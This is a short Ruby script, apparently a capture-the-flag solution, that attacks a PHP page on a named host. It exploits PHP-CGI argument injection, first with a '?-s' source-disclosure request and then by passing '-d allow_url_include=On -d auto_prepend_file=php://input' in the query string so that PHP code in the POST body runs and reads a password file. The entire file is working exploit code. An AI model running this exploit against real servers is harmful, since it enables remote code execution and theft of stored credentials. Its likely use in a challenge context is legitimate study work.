#!/usr/bin/ruby
require 'net/http'
require 'cgi'

class String
	def escape() CGI.escape(self) end
end

uri=URI.parse('http://whitecafe.moe.hm/take52_sub/index.php')
#stage1
#puts Net::HTTP.get(uri.host,uri.path+'?-s') # include_once './pass.inc'; $default_id/$default_pass

#stage2
#-d allow_url_include=On -d auto_prepend_file=data:text/plain,<?php file_get_contents('./pass.inc');?>
http=Net::HTTP.new(uri.host)
http.set_debug_output $stderr
http.start{
	resp=http.post(
		uri.path+'?'+['-d','allow_url_include=On','-d','auto_prepend_file=php://input'].map(&:escape)*'%20',
		"<?php file_get_contents('./pass.inc');?>&id=foo&pass=bar"
	)
	puts resp.body
}